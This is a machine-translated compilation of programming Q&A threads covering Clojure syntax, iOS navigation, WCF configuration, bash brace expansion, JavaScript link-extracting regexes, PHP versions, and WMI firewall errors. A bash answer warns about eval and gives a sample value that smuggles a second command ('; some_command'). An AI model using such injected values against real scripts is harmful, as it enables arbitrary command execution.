> 标签：lisp, clojure, symbols

我有以下 Clojure 代码，但我不确定它为什么不起作用：

```
(defn match (x y &optional binds)
  (cond
   ((eql x y) (values binds t))
   ((assoc x binds) (match (binding x binds) y binds))
   ((assoc y binds) (match x (binding y binds) binds))
   ((var? x) (values (cons (cons x y) binds) t))
   ((var? y) (values (cons (cons y x) binds) t))
   (t
    (when (and (consp x) (consp y))
      (multiple-value-bind (b2 yes)
                           (match (car x) (car y) binds)
        (and yes (match (cdr x) (cdr y) b2))))))) 
```

（代码翻译自 Paul Graham 的*ANSI Common Lisp*书。）

当我运行它时，我收到以下错误：

```
java.lang.IllegalArgumentException: Don't know how to create ISeq from: Symbol
clojure.lang.Compiler$CompilerException: NO_SOURCE_FILE:2: java.lang.RuntimeException: java.lang.IllegalArgumentException: Don't know how to create ISeq from: Symbol
        at clojure.lang.Compiler.analyze(Compiler.java:3713)
        at clojure.lang.Compiler.analyzeSeq(Compiler.java:3848)
        at clojure.lang.Compiler.analyze(Compiler.java:3698)
        at clojure.lang.Compiler.access$200(Compiler.java:37)
        at clojure.lang.Compiler$DefExpr$Parser.parse(Compiler.java:343)
        at clojure.lang.Compiler.analyzeSeq(Compiler.java:3858)
        at clojure.lang.Compiler.analyze(Compiler.java:3698)
        at clojure.lang.Compiler.analyzeSeq(Compiler.java:3848)
        at clojure.lang.Compiler.analyze(Compiler.java:3698)
        at clojure.lang.Compiler.analyze(Compiler.java:3671)
        at clojure.lang.Compiler.eval(Compiler.java:3895)
        at clojure.lang.Repl.main(Repl.java:75)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at jline.ConsoleRunner.main(ConsoleRunner.java:69)
Caused by: java.lang.RuntimeException: java.lang.RuntimeException: java.lang.IllegalArgumentException: Don't know how to create ISeq from: Symbol
        at clojure.lang.LazyCons.rest(LazyCons.java:64)
        at clojure.lang.ASeq.count(ASeq.java:85)
        at clojure.lang.RT.count(RT.java:486)
        at clojure.lang.Cons.count(Cons.java:41)
        at clojure.lang.Compiler.analyze(Compiler.java:3695)
        ... 16 more
Caused by: java.lang.RuntimeException: java.lang.IllegalArgumentException: Don't know how to create ISeq from: Symbol
        at clojure.lang.LazyCons.first(LazyCons.java:44)
        at clojure.lang.LazyCons.rest(LazyCons.java:59)
        ... 20 more
Caused by: java.lang.IllegalArgumentException: Don't know how to create ISeq from: Symbol
        at clojure.lang.RT.seqFrom(RT.java:465)
        at clojure.lang.RT.seq(RT.java:448)
        at clojure.seq__28.invoke(boot.clj:92)
        at clojure.every_QMARK___596.invoke(boot.clj:1180)
        at clojure.fn__1147$psig__1149.invoke(boot.clj:2155)
        at clojure.map__602$fn__605.invoke(boot.clj:1214)
        at clojure.lang.LazyCons.first(LazyCons.java:40)
        ... 21 more 
```

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2008-12-15T18:48:48.613

问题是我使用括号（'（'和'）'），而不是方括号（'['和']'）作为参数列表。

它应该像这样开始：

```
(defn match [x y &optional binds] 
```

（我在Stuart Halloway的*Programming Clojure中找到了答案。）*

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2008-12-15T23:10:16.263

此外， cond 形式的子句不使用括号：

```
(cond
  test1 eval1
  test2 eval2
  :else eval3) 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2008-12-24T07:14:52.530

主要答案已经给出（函数参数在 [] 而不是 () 在 clojure 中）但在尝试弄乱 Common Lisp 源代码之前，我建议实际学习 Clojure 的语法，因为它与纯 CL 不相近港口，在所有。你只会遇到麻烦，像对待它一样对待它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2011-01-13T10:26:09.190

这似乎是各种语法错误的症状。

我不小心`.`在文档字符串之后写了一个，即`"bla bla".`而不是`"bla bla."`. 很难找到，因为错误消息中的行号不正确。

# iphone - 带有导航控制器的标签栏应用程序

> ID：369128
> 
> 赞同：45
> 
> 时间：2008-12-15T17:33:35.537
> 
> 标签：iphone, tabbar

我有一个简单的 iPhone 应用程序，它有一个标签栏和 3 个标签。每个选项卡都作为带有相应控制器的单独 nib 加载。每个 nib 都包含一个 tableview 以及一些用于搜索/过滤等的其他控件。

我想要（并且似乎找不到示例）是向应用程序添加导航控制器，以便每个笔尖（即每个选项卡）都可以深入了解更多详细信息页面。

我应该将导航控制器添加到主窗口并为其创建一个导航控制器，`IBOutlet`还是应该将 NC 添加到笔尖。

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2008-12-15T17:42:40.853

一旦你在 XIB 中有一个标签栏，最简单的方法是将 UINavigationController 对象从库窗口（看起来像金色背景上的左侧导航栏按钮）拖到标签栏的树视图中（仅文本视图，而不是 GUI）。将导航控制器放在标签栏控制器内，然后将现有视图控制器拖到导航控制器内。

当您查看该选项卡时，您应该会在其顶部看到一个导航栏...如果您从另一个 xib 加载导航控制器，您将修改选项卡栏 xib 中的导航栏。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2012-02-15T08:30:00.827

这是如何以编程方式添加 NavigationController（例如在您的 AppDelegate 中）

```
 UIViewController  *viewController1, *viewController2;

    viewController1 = [[[UIViewController alloc] initWithNibName:@"FirstViewController_iPhone" bundle:nil] autorelease];
    UINavigationController *navigationcontroller = [[[UINavigationController alloc] initWithRootViewController:viewController1] autorelease];

    viewController2 = [[[UIViewController alloc] initWithNibName:@"SecondViewController_iPhone" bundle:nil] autorelease];

    self.tabBarController = [[[UITabBarController alloc] init] autorelease];
    self.tabBarController.viewControllers = [NSArray arrayWithObjects:navigationcontroller, viewController2, nil]; 
```

如果您在 Viewcontroller1 中有一个 tableview，您可以通过使用`self.navigationController`例如在`didSelectRowAtIndexPath`打开 DetailView来访问 Navigationcontroller

例如。

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    DetailViewController *detailViewController = [[DetailViewController alloc] initWithNibName:@"DetailViewController" bundle:nil];
    [self.navigationController pushViewController:detailViewController animated:YES];
    [detailViewController release];
} 
```

在此示例中，detailViewController 使用 NIB 文件初始化，该文件添加了带有后退按钮的导航栏。但是，如果您也以`detailViewController`编程方式初始化，您可以向 a 添加一个操作 (GoBack) 以从其导航控制器`UIBarButtonItem`中删除。`detailViewController`

```
-(void) GoBack
{    
    [self.navigationController popViewControllerAnimated:YES];
} 
```

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2010-02-12T05:41:40.820

我意识到这已经很晚了，但是这个问题今天在谷歌搜索结果中排名第一，所以我想我会添加一个答案。O'Reilly 有一个很棒的 youtube 视频教程，它会引导您完成一个标签栏 + 导航控制器应用程序。在这里查看：[http ://www.youtube.com/watch?v=LBnPfAtswgw](http://www.youtube.com/watch?v=LBnPfAtswgw)

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2008-12-15T18:44:47.857

The way to think about it is this:

You want each tab to have a navigation controller. Then, each nav controller needs to have a root view controller and a loaded Nib.

So, in IB, add nav controllers for each of your tabs. Then, configure each nav controller to have the appropriate root view controller and Nib.

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2012-04-18T22:12:37.950

很多答案，但没有检查...

当然，现在使用 Xcode 界面生成器中的故事板，这一切都变得非常简单：

创建感兴趣的导航控制器，然后选择菜单**`Editor`**和项目**`Embed In >`**，然后**`Tab Bar Controller`**。

当您从新项目的主/详细拆分视图控制器模板开始时，这甚至适用于 Xcode 为您提供的导航控制器。在这两种情况下，我现在都有一个标签栏控制器作为我的主人；对于 iPhone，它会通过终端控制器一路涟漪，而在 iPad 上，它仅将选项卡保留在主控器中（即横向拆分右侧，纵向弹出框）。

* * *

## 回答 #6

> 赞同：6
> 
> 时间：2010-08-11T15:31:37.823

还有一个从马嘴里说出来的方法：

[http://developer.apple.com/iphone/library/featuredarticles/ViewControllerPGforiPhoneOS/CombiningViewControllers/CombiningViewControllers.html#//apple_ref/doc/uid/TP40007457-CH104-SW2](http://developer.apple.com/iphone/library/featuredarticles/ViewControllerPGforiPhoneOS/CombiningViewControllers/CombiningViewControllers.html#//apple_ref/doc/uid/TP40007457-CH104-SW2)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2011-07-14T10:36:04.717

打开您的 UITabBarController 的 XIB 文件（来自 MainWindow.xib）

转到“标签栏控制器属性”。您将在那里看到一个“视图控制器”部分，其中将提到每个选项卡的视图控制器。只需将控制器的类型更改为您想要的任何选项卡的 NavigationController。

选择您已更改的控制器的视图，并检查其属性中的 loadFromNib 选项，然后选择正确的 nib。（因为更改控制器类型后，此连接将丢失）

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2015-09-30T07:13:46.720

这个问题太老了，但是 SDK 升级了，一些读者可能需要新的答案。所以，现在对于故事板用户来说，同时使用 Tabbar 和 Navigation 控制器的答案非常简单。

1.  将导航控制器拖动到情节提要内。
2.  将启动箭头分配给新的导航控制器，使控制器作为起点。
3.  拖动 Tabbar 控制器并使用选项卡和所需的控制器进行设置。您也可以稍后根据需要设置带有标签的标签栏控制器。
4.  选择导航控制器并将其“根视图控制器”与标签栏控制器绑定。

这将使用导航和 tabview 控制器加载应用程序。

# wcf - wcf 最大消息大小

> ID：369132
> 
> 赞同：2
> 
> 时间：2008-12-15T17:34:51.430
> 
> 标签：wcf, size, service, message, max

我有两个服务，并且在它们之间发送相当大的消息（~100kb）。尽管前面提到的值是消息大小的典型值，但它可能会大幅波动（正向和负向）。

因此，为了处理我必须传输膨胀消息的这种情况，我已经在客户端和服务器端的 app.config 中设置了所有最大消息大小、最大字符串大小等属性（相关端点正确引用了绑定其中说明了尺寸）。

为了安全起见，我输入的界限完全超过了任何可能的消息大小。然而，在消息大小尺度的低端，服务间通信已被证明是可靠的，但在高端，情况并非如此——消息似乎根本没有被传递。

最奇怪的是，*如果*消息超过了最大大小，则会抛出异常（我已经遇到了足够多的这些，知道这一点！大声笑），但什么都没有抛出——这一切都完全无声无息地过去了。我已经尝试过各种大小的消息，并且它肯定只是随着消息大小的增长才开始发生。我可以证明目标服务没有接收到，因为在接收到后，该服务会在数据库中记录日志 - 但是对于大消息，不会生成日志。

正如我所说，我几乎可以肯定我已经增加了 app.config 中所有适用属性的大小，所以我对这种行为完全感到困惑！

关于什么可能导致这种神秘行为的任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-17T10:25:49.097

well this problem seems to have resolved itself (suddenly after never complaining before, WCF started getting upset about a certain value in the app.config, changed that and it seemed to work then!)

however now i have an equally strange problem! for somre reason it refuses to accept that i have configured metadata to be published. my app.config (host side) set up is as follows:

```
<services>
  <service name="DataFeederService.FeederService" behaviorConfiguration="DataFeederService.FeederServiceBehavior">
    <host>
      <baseAddresses>
        <add baseAddress="http://localhost:8010/Feeder"/>
        <add baseAddress="net.pipe://localhost/FeederPipe"/>
      </baseAddresses>
    </host>
    <!-- Service Endpoints -->
    <!-- Unless fully qualified, address is relative to base address supplied above -->
    <endpoint name="namedPipeEndpoint" 
    address=""  
    bindingConfiguration="IPCWindowsSecurity" 
    binding="netNamedPipeBinding" 
    contract="DataFeederService.IFeederService">
      <identity>
        <dns value="localhost" />
      </identity>
    </endpoint>

    <endpoint name="httpEndpoint" 
    address="FeederService" 
    binding="wsHttpBinding" 
    bindingConfiguration="httpBinding" 
    contract="DataFeederService.IWebFeederService"/>

    <!-- Metadata Endpoints -->
    <!-- The Metadata Exchange endpoint is used by the service to describe itself to clients. -->
    <!-- This endpoint does not use a secure binding and should be secured or removed before deployment -->
    <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange"/>
  </service>
</services>

<bindings>
  <netNamedPipeBinding>
    <binding name="IPCWindowsSecurity" 
    maxBufferPoolSize="965536" 
    maxBufferSize="965536" 
    maxReceivedMessageSize="965536">
      <readerQuotas maxStringContentLength="965536" />
      <security mode="Transport">
        <transport protectionLevel="EncryptAndSign" />
      </security>
    </binding>
  </netNamedPipeBinding>
  <wsHttpBinding>
    <binding name="httpBinding" 
    maxBufferPoolSize="965536"
    maxReceivedMessageSize="965536">
      <readerQuotas maxStringContentLength="965536" />
    </binding>
  </wsHttpBinding>
</bindings>

<behaviors>
  <serviceBehaviors>
    <behavior name="DataFeederService.FeederServiceBehavior">
      <!-- To avoid disclosing metadata information, 
      set the value below to false and remove the metadata endpoint above before deployment -->
      <serviceMetadata httpGetEnabled="True" policyVersion="Policy15"/>
      <!-- To receive exception details in faults for debugging purposes, 
      set the value below to true.  Set to false before deployment 
      to avoid disclosing exception information -->
      <serviceDebug includeExceptionDetailInFaults="True" httpHelpPageEnabled="true" />
    </behavior>
  </serviceBehaviors>
</behaviors> 
```

I have tried my best to work out why it would be claiming the metadata isn't being published at the specified address "[http://localhost:8010/Feeder/mex](http://localhost:8010/Feeder/mex)". any help would be **greatly** appreciated.

Cheers!

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-17T11:17:14.453

对不起，经过进一步的拖网，我发现了错误的根源！datacontract 中的一个类已更改（[DataContract] 属性已被删除，但奇怪的是 [DataMemeber] 已留在相关属性上！非常奇怪！）

无论如何，感谢您的所有帮助，尤其是 rfor 让我走到了这一步，我终于可以摆脱这个该死的项目了 :-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-12-16T12:46:29.127

WCF 偶尔会出现一些问题，这些问题会导致它“静默”失败（即没有例外），这可能很难调试。听起来这可能就是您所看到的情况。

在这种情况下，[启用 WCF 中的跟踪选项](http://msdn.microsoft.com/en-us/library/ms733025.aspx)非常有用，因为它应该允许您查看消息是否确实到达了服务以及调度程序如何处理它。

# .net - 你如何管理和组织你的游戏组件？

> ID：369141
> 
> 赞同：1
> 
> 时间：2008-12-15T17:37:27.650
> 
> 标签：.net, xna

在业余时间，我正在使用 Microsoft 的 XNA 框架编写一个小游戏。回顾我为熟悉 XNA 而编写的第一个原型，我发现无法以分层方式构建我的（可绘制的）游戏组件，这很烦人。为了做到这一点，我接近实现一种`Composite`*（可绘制） 。*`GameComponent`但在重新发明轮子之前，我问你：你更喜欢用什么方式来管理和构建分层相关的游戏组件？

谢谢，普伦森

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-12-15T17:50:31.337

XNA 是用于编写游戏引擎的框架，而不是游戏引擎 :) 你说的是[场景图](http://en.wikipedia.org/wiki/Scene_graph)

# bash - 如何将全局表达式分配给 Bash 脚本中的变量？

> ID：369145
> 
> 赞同：49
> 
> 时间：2008-12-15T17:38:54.747
> 
> 标签：bash, glob

在 bash 脚本中执行以下两行代码时，“ls”会抱怨文件不存在：

```
dirs=/content/{dev01,dev02}
ls -l $dirs 
```

当我使用 -x 选项运行脚本时，它似乎在单引号内传递变量（这将防止通配符）：

```
+ dirs=/content/{dev01,dev01}
+ ls -l '/content/{dev01,dev01}'
ls: /content/{dev01,dev01}: No such file or directory 
```

如果我从交互式 shell（无引号）执行“ls”命令，它将返回两个目录。

我一直在阅读 Bash 参考手册（v 3.2）并且看不到任何不发生文件名通配的原因（我没有将 -f 传递给 shell），或者我可以设置的任何内容以确保发生通配。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2008-12-15T17:51:33.363

我认为这是扩展的顺序：

> 扩展的顺序是：`brace expansion`、波浪号扩展、参数 `variable`和算术扩展和命令替换（以从左到右的方式完成）、分词和`pathname expansion`.

因此，如果您的变量被替换，则不再发生大括号扩展。这对我有用：

```
eval ls $dirs 
```

使用 eval 时要非常小心。它将逐字执行这些东西。因此，如果 dirs 包含`f{m,k}t*; some_command`， some_command 将在 ls 完成后执行。它将执行您`eval`在当前 shell 中提供的字符串。它将传递`/content/dev01 /content/dev02`给 ls，无论它们是否存在。放在`*`这些东西之后使其成为路径名扩展，它将省略不存在的路径：

```
dirs=/content/{dev01,dev02}* 
```

我不是 100% 确定这一点，但这对我来说很有意义。

* * *

## 回答 #2

> 赞同：28
> 
> 时间：2008-12-15T18:00:14.453

[这](https://web.archive.org/web/20090403131119/http://www.mydatabasesupport.com/forums/shell/393265-bash-glob-expansion.html)是对您尝试做的事情的精彩讨论。

简短的回答是你想要一个数组：

```
dirs=(/content/{dev01,dev01}) 
```

但是你对结果所做的事情可能会比我认为的目标更复杂。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2016-05-24T14:07:21.370

对于通过谷歌找到这个的人（比如我），@Peter 和@feoh 的答案是“如何在 bash 脚本中全局变量”的一般解决方案。

```
list_of_results=(pattern) 
```

将匹配的现有文件名保存`pattern`到数组`list_of_results`中。的每个元素`list_of_results`将包含一个文件名、空格和所有元素。

您可以从 0 开始访问每个结果`"${list_of_results[<index>]}"`。`<index>`您可以获得整个列表，正确引用，如`"${list_of_results[@]}"`.

* * *

## 回答 #4

> 赞同：9
> 
> 时间：2008-12-15T18:10:49.160

这不是文件名通配，这是大括号扩展。差异是微妙的，但它存在 - 在文件名通配中，您只会收到现有文件，而在大括号扩展中，您可以生成任何类型的字符串。

[http://www.gnu.org/software/bash/manual/bashref.html#Brace-Expansion](http://www.gnu.org/software/bash/manual/bashref.html#Brace-Expansion)

[http://www.gnu.org/software/bash/manual/bashref.html#Filename-Expansion](http://www.gnu.org/software/bash/manual/bashref.html#Filename-Expansion)

现在，这对我有用：

```
#!/bin/sh
dirs=`echo ./{dev01,dev02}`
ls $dirs 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-03-08T13:16:55.027

由于您要 glob*文件，*因此不应使用大括号扩展。在这种情况下使用大括号扩展是一种*反模式*，并且绝对是错误的工作工具。

你想要的是[扩展通配符](http://www.gnu.org/software/bash/manual/bashref.html#Pattern-Matching)：

```
shopt -s extglob # likely already set in interactive shells

dirs=/content/@(dev01|dev02)
ls $dirs 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2016-03-08T12:36:30.147

我怀疑您需要的是一个数组，但这会将您限制在更新的 bash 中。它比使用 eval 更节省。

```
dirs=( /"content with spaces"/{dev01,dev02} )

dirs=( /content/{dev01,dev02} )
ls -l "${dirs[@]}" 
```

* * *

```
/content/{dev01,dev02} 
```

将扩展为：

```
"/content/dev01" "/content/dev02" 
```

这些目录的存在与扩展无关。

当您将变量分配给大括号扩展时，它变得不可预测。

```
dirs=/content/{dev01,dev02} 
```

可能变成

```
"/content/dev01" 
```

或者

```
"/content/dev01 /content/dev02" 
```

或者

```
"/content/dev01" "/content/dev02" 
```

或者

```
"/content/{dev01,dev02}" 
```

如果您以任何方式引用大括号，它们将不会扩展，因此结果将包含大括号并且几乎没有意义。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-12-15T17:46:49.830

```
ls `echo $dirs` 
```

在cygwin下工作。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2018-11-07T10:59:28.270

没有人解决的问题是变量分配产生了影响。

```
dirs=/content/{dev01,dev02} 
```

扩展方式不同于

```
echo /content/{dev01,dev02} 
```

问题是如何将展开的结果分配给`dirs`

请参阅：[如何在变量声明中使用 Bash 替换](https://stackoverflow.com/questions/8700530/how-to-use-bash-substitution-in-a-variable-declaration#comment10833052_8700530)

# javascript - javascript 正则表达式从锚标签中提取锚文本和 URL

> ID：369147
> 
> 赞同：18
> 
> 时间：2008-12-15T17:40:18.317
> 
> 标签：javascript, regex, anchor

我在一个名为“input_content”的javascript变量中有一段文本，该文本包含多个锚标签/链接。我想匹配所有的锚标签并提取锚文本和 URL，并将其放入一个类似（或类似）的数组中：

```
大批
(
    [0] => 数组
        (
            [0] => <a href="http://yahoo.com">雅虎</a>
            [1] => http://yahoo.com
            [2] => 雅虎
        )
    [1] => 数组
        (
            [0] => <a href="http://google.com">谷歌</a>
            [1] => http://google.com
            [2] => 谷歌
        )
)
```

我已经破解了它（[http://pastie.org/339755](http://pastie.org/339755)），但我很难过这一点。谢谢您的帮助！

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2008-12-15T17:50:03.647

```
var matches = [];

input_content.replace(/[^<]*(<a href="([^"]+)">([^<]+)<\/a>)/g, function () {
    matches.push(Array.prototype.slice.call(arguments, 1, 4))
}); 
```

这假定您的锚将始终采用形式，即如果有任何其他属性（例如， ）`<a href="...">...</a>`，它将不起作用。`target`可以改进正则表达式以适应这种情况。

分解正则表达式：

```
/ -> 开始正则表达式
  [^<]* -> 跳过所有字符，直到第一个 <
  ( -> 开始捕获第一个令牌
    <a href=" -> 捕获第一个锚点
    ( -> 开始捕获第二个令牌
        [^"]+ -> 捕获所有字符直到 "
    ) -> 结束捕获第二个令牌
    "> -> 捕获更多的锚点
    ( -> 开始捕获第三个令牌
        [^<]+ -> 捕获所有字符，直到一个 <
    ) -> 结束捕获第三个标记
    </a> -> 捕获锚的最后一位
  ) -> 结束捕获第一个令牌
/g -> 结束正则表达式，添加全局标志以匹配字符串中的所有锚点

```

每次调用我们的匿名函数都会收到三个标记作为第二、第三和第四个参数，即 arguments[1]、arguments[2]、arguments[3]：

*   arguments[1] 是整个锚点
*   arguments[2] 是 href 部分
*   arguments[3] 是里面的文字

我们将使用 hack 将这三个参数作为一个新数组推送到我们的主`matches`数组中。`arguments`内置变量不是真正的 JavaScript 数组，因此我们必须对其应用Array`split`方法来提取我们想要的项目：

```
Array.prototype.slice.call(arguments, 1, 4) 
```

这将从`arguments`索引 1 开始到索引 4 结束（不包括在内）提取项目。

```
var input_content = "blah \
    <a href=\"http://yahoo.com\">Yahoo</a> \
    blah \
    <a href=\"http://google.com\">Google</a> \
    blah";

var matches = [];

input_content.replace(/[^<]*(<a href="([^"]+)">([^<]+)<\/a>)/g, function () {
    matches.push(Array.prototype.slice.call(arguments, 1, 4));
});

alert(matches.join("\n")); 
```

给出：

```
<a href="http://yahoo.com">雅虎</a>,http://yahoo.com,雅虎
<a href="http://google.com">谷歌</a>,http://google.com,谷歌

```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-12-15T17:57:08.890

由于您可能在网络浏览器中运行 javascript，因此 regex 似乎是个坏主意。如果段落首先来自页面，请获取容器的句柄，调用`.getElementsByTagName()`以获取锚点，然后以这种方式提取所需的值。

如果这不可能，则创建一个新的 html 元素对象，将您的文本分配给它的 .innerHTML 属性，然后调用`.getElementsByTagName()`.

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2008-12-15T18:12:34.723

我认为 Joel 有权这样做——正则表达式因标记不好而臭名昭著，因为要考虑的可能性实在是太多了。锚标签还有其他属性吗？它们的顺序是什么？分隔空格是否总是一个空格？鉴于您已经拥有可用的浏览器 HTML**解析器**，最好将其投入使用。

```
function getLinks(html) {
    var container = document.createElement("p");
    container.innerHTML = html;

    var anchors = container.getElementsByTagName("a");
    var list = [];

    for (var i = 0; i < anchors.length; i++) {
        var href = anchors[i].href;
        var text = anchors[i].textContent;

        if (text === undefined) text = anchors[i].innerText;

        list.push(['<a href="' + href + '">' + text + '</a>', href, text];
    }

    return list;
} 
```

无论链接的存储方式如何，这都会返回一个与您描述的数组类似的数组。请注意，您可以通过将参数名称更改为“容器”并删除前两行来更改函数以使用传递的元素而不是文本。textContent/innerText 属性获取为链接显示的文本，去除任何标记（粗体/斜体/字体/…）。如果要保留标记，可以将 .textContent 替换为 .innerHTML 并删除内部 if() 语句。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-12-15T18:08:41.690

我认为[JQuery](http://docs.jquery.com/)将是您最好的选择。这不是最好的脚本，我相信其他人可以提供更好的东西。但这会创建一个您正在寻找的数组。

```
<script type="text/javascript">
    // From http://brandonaaron.net Thanks!
    jQuery.fn.outerHTML = function() {
        return $('<div>').append( this.eq(0).clone() ).html();
    };    

    var items = new Array();
    var i = 0;

    $(document).ready(function(){
        $("a").each(function(){
            items[i] = {el:$(this).outerHTML(),href:this.href,text:this.text};
            i++;      
        });
    });

    function showItems(){
        alert(items);
    }

</script> 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-07-14T10:40:36.757

为了搜索者的利益：我创建了一些可以与锚标记中的其他属性一起使用的东西。对于那些不熟悉 Regex 的人，美元（$1 等）值是 regex 组匹配项。

```
var text = 'This is my <a target="_blank" href="www.google.co.uk">link</a> Text';
var urlPattern = /([^+>]*)[^<]*(<a [^>]*(href="([^>^\"]*)")[^>]*>)([^<]+)(<\/a>)/gi;
var output = text.replace(urlPattern, "$1___$2___$3___$4___$5___$6");
alert(output); 
```

请参阅工作[jsFiddle](https://jsfiddle.net/6fyke150/19/)和[regex101](https://regex101.com/r/nT1hW5/4)。

或者，您可以从以下组中获取信息：

```
var returnText = text.replace(urlPattern, function(fullText, beforeLink, anchorContent, href, lnkUrl, linkText, endAnchor){
                    return "The bits you want e.g. linkText";
                }); 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2016-09-10T21:45:06.947

提取网址：

var 模式 = /。*href="(.* )".*/; var url = string.replace(pattern,'$1');

演示：

```
//var string = '<a id="btn" target="_blank" class="button" href="https://yourdomainame.com:4089?param=751&amp;2ndparam=2345">Buy Now</a>;'
//uncomment the above as an example of link.outerHTML

var string = link.outerHTML
var pattern = /.*href="(.*)".*/;
var href = string.replace(pattern,'$1');
alert(href) 
```

对于“锚文本”，为什么不使用： `link.innerHtml`

# php - 如何在运行 php4 的机器上制作 php5，而不破坏任何东西

> ID：369150
> 
> 赞同：1
> 
> 时间：2008-12-15T17:41:54.240
> 
> 标签：php, sysadmin

我知道使用 python 和其他几种语言有一种方法可以安全地将更新的语言版本安装到机器上，但是在深入研究 PHP5 的配置和生成文件之后，我唯一看到的是前缀 dir 选项和ini 扫描路径。

理想情况下，我希望 php5 在 /usr/local 中有自己的 lib/bin 子目录，然后我可以将 php5 放在 php4 之后的路径中，或者从 php5 二进制文件到 php5-cli、php5-cgi 等进行符号链接.

另外，我在这里遗漏了什么严重的问题吗？有问题的服务器是一个仍然有点忙的遗留应用程序服务器，将于 2009 年 6 月被弃用，但与此同时，计划是开始使用 php5 代码更新部分。

机器状态：CENTOS 5 PHP 4 是从 yum 控制之外的源 RPM 构建的

大多数 php4 位于不明确的目录中：/usr/{include,lib}/php

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-12-15T19:04:28.210

这是关于如何在 Gentoo 上执行此操作的非常详细的说明，并提供了一些需要注意的提示。

[链接文本](http://www.gentoo.org/proj/en/php/php4-php5-configuration.xml)

这是另一个很好的衡量标准

[链接文本](http://www.howtoforge.com/apache2_with_php5_and_php4)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-12-15T18:41:08.380

cli版本应该很简单

```
configure --prefix=/usr/local/php5
make install-cli 
```

不可能在一个 Apache 服务器中同时运行 PHP4 和 PHP5 作为**模块。**但是可以将 php 版本 X 作为模块运行，将 Y 版本作为 cgi 运行。它也可以同时作为 cgi 运行。

我找到了这些演练：

1.  [与 PHP4 并行设置 PHP5](http://www.aditus.nu/jpgraph/apache2suse10.php)
2.  [配置 Apache 以使用 PHP4 和 PHP5](http://www.gentoo.org/proj/en/php/php4-php5-configuration.xml)
3.  [更多谷歌结果](http://www.google.com/search?q=php5+php4+1+apache)

# .net - 使用 concat() 从 mysql 存储过程中检索和绑定到 datagridview 时出错

> ID：369151
> 
> 赞同：0
> 
> 时间：2008-12-15T17:41:57.983
> 
> 标签：.net, mysql, datagridview

每次我使用 concat 函数从 mysql 存储过程中检索数据时，在将 datagridview 绑定到包含返回行的数据表后都会发生错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2011-04-20T14:33:50.300

`select CAST(concat(column1, column2)AS CHAR)`从表 1 连接

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-15T18:14:45.953

我想你应该为选定的值创建一个别名：

```
select concat(column1, column2) as concatenated from table1 
```

# com - 连接到 WMI：某些机器上的 0x800706ba 错误（但不是全部）

> ID：369177
> 
> 赞同：4
> 
> 时间：2008-12-15T17:50:27.547
> 
> 标签：com, powershell, wmi, rpc

当我尝试从 Powershell、ConfigMgr 或 WMI 资源管理器连接到 WMI 时，我可以与我的大多数计算机通信，但有些（可能是 30%？）返回 0x800706ba（RPC 服务器不可用）。

如果我关闭远程机器上的防火墙，查询就会开始工作。不过，我尝试了一堆不同的防火墙设置配置，但我似乎无法弄清楚例外的正确组合是什么。

这是我在远程机器上的防火墙配置的相关位。疯狂的部分是pfirewall.log 在它不起作用时没有列出**任何丢弃- 但是同样，如果我关闭远程计算机上的防火墙，一切都会开始运行。**

我会照顾这个线程，因为我知道你可能需要更多细节来诊断这个。

```
Domain profile configuration (current):
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Service configuration for Domain profile:
Mode     Customized  Name
-------------------------------------------------------------------
Enable   No          Remote Desktop

Allowed programs configuration for Domain profile:
Mode     Name / Program
-------------------------------------------------------------------
Enable   Remote Assistance / C:\WINDOWS\system32\sessmgr.exe
Enable   Network Diagnostics for Windows XP / C:\WINDOWS\Network Diagnostic\xpnetdiag.exe

Port configuration for Domain profile:
Port   Protocol  Mode     Name
-------------------------------------------------------------------
3389   TCP       Enable   Remote Desktop

Standard profile configuration:
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Service configuration for Standard profile:
Mode     Customized  Name
-------------------------------------------------------------------
Enable   No          Remote Desktop

Allowed programs configuration for Standard profile:
Mode     Name / Program
-------------------------------------------------------------------
Enable   Remote Assistance / C:\WINDOWS\system32\sessmgr.exe
Enable   McAfee Framework Service / C:\Program Files\McAfee\Common Framework\FrameworkService.exe
Enable   Network Diagnostics for Windows XP / C:\WINDOWS\Network Diagnostic\xpnetdiag.exe

Port configuration for Standard profile:
Port   Protocol  Mode     Name
-------------------------------------------------------------------
